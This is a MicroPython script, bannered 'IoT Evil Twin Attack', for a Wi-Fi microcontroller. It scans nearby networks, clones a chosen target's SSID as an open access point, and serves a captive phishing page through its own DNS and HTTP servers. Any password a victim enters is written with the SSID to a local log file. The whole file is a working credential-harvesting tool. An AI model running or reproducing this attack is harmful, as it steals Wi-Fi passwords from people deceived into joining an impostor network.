import network
import time
import uos
import gc
import machine
import uselect as select
from captive_dns import DNSServer
from captive_http import HTTPServer
sta_if=network.WLAN(0)
sta_if.active(True)
machine.freq(160000000)
#ap_if.network
def banner():
    print('  _____  __   ___  __  __ _    _         ')
    print(' |_   _|/ /  / _ \\|  \\/  | |  | |        ')
    print('   | | / /_ | | | | \\  / | |__| |____    ')
    print('   | || \'_ \\| | | | |\\/| |  __  |_  /    ')
    print('  _| || (_) | |_| | |  | | |  | |/ /     ')
    print(' |_____\\___/ \\___/|_|__|_|_|  |_/___|    ')
    print(' |  ____|   (_) | |__   __|     (_)      ')
    print(' | |____   ___| |    | |_      ___ _ __  ')
    print(' |  __\\ \\ / / | |    | \\ \\ /\\ / / | \'_ \\ ')
    print(' | |___\\ V /| | |    | |\\ V  V /| | | | |')
    print(' |______\\_/ |_|_|    |_| \\_/\\_/ |_|_| |_|')
    print('     /\\  | | | |           | |           ')
    print('    /  \\ | |_| |_ __ _  ___| | __        ')
    print('   / /\\ \\| __| __/ _` |/ __| |/ /        ')
    print(' / ____ \\ |_| || (_| | (__|   <         ')
    print('/_/    \\_\\__|\\__\\__,_|\\___|_|\\_\\        ')                       
local_ip="192.168.1.1"
class captive:
    def __init__(self, ssid):
        
        """ Ap CONFIG"""
        self.ap_if= network.WLAN(1)
        self.ap_if.config(essid=ssid, authmode=network.AUTH_OPEN)
        self.ap_if.ifconfig((local_ip, "255.255.255.0", local_ip, local_ip)) #Local ip, net mask, gateway,dns
        self.ap_if.active(True)
        self.ssid=ssid
    def start(self,index):
        """ Start Captive Portal"""
        self.poller=select.poll() 
        self.http_server = HTTPServer(self.poller, local_ip)
        self.dns_server=DNSServer(self.poller,local_ip)
        n=index.find(".")
        self.http_server.set_route(b"/",index.encode())
        files=uos.listdir()
        for file in files:
            if file[:n+1]==index[:n+1] and file!=index:
                print(file[n+1:])
                self.http_server.set_route(("/"+file[n+1:]).encode(),file.encode())
        self.http_server.ssid=self.ssid
        try:
            while True:
                gc.collect()
                # check for socket events and handle them
                for response in self.poller.ipoll(1000):
                    sock, event, *others = response
                    is_handled = self.handle_dns(sock, event, others)
                    if not is_handled:
                        self.handle_http(sock, event, others)

                
                if self.http_server.password!=None:
                    log=open("exy","a+")
                    log.write("%s:%s\n" % (self.ssid, self.http_server.password) )
                    log.close()
                    self.http_server.password=None
                  

        except KeyboardInterrupt:
            print("Captive portal stopped")
            

    def handle_dns(self, sock, event, others):
            if sock is self.dns_server.sock:
                # ignore UDP socket hangups
                if event == select.POLLHUP:
                    return True
                self.dns_server.handle(sock, event, others)
                return True
            return False

    def handle_http(self, sock, event, others):
        self.http_server.handle(sock, event, others)
    def cleanup():
        self.ap_if.active(False)
def find_index():
    files=uos.listdir()
    indexs=list()
    for file in files:
        if len(file)-file.find('.html')==5:
            indexs.append(file)
    return indexs
    #

    
   
if __name__=="__main__":
    """User Interface"""
    print("\x1b[2J")
    banner()
    choise=-1
    while choise==-1:
        ap_list=sta_if.scan()
        print("Wifi scan started.")
        n=0
        for ap in ap_list:
           print (str(n)+" "+str(ap)) 
           n+=1
        print ("-1 re-scan")
        choise=int(input('Select Target Wifi:'))
    
    target=ap_list[choise]
    del ap_list
    mac = ""
    for b in target[1]:
        mac += "%02x" % b
    print('ssid:',target[0],'mac:',mac)
    cap=captive(target[0])
    indexs=find_index()
    if len(indexs)==1:
        index=indexs[0]
    elif len(indexs)>1:
        n=0
        for index in indexs:
            print(str(n)+" "+index)
            n+=1
        index=indexs[int(input('Select index:'))]
    else:
        print('index not found')
            
    cap.start(index)
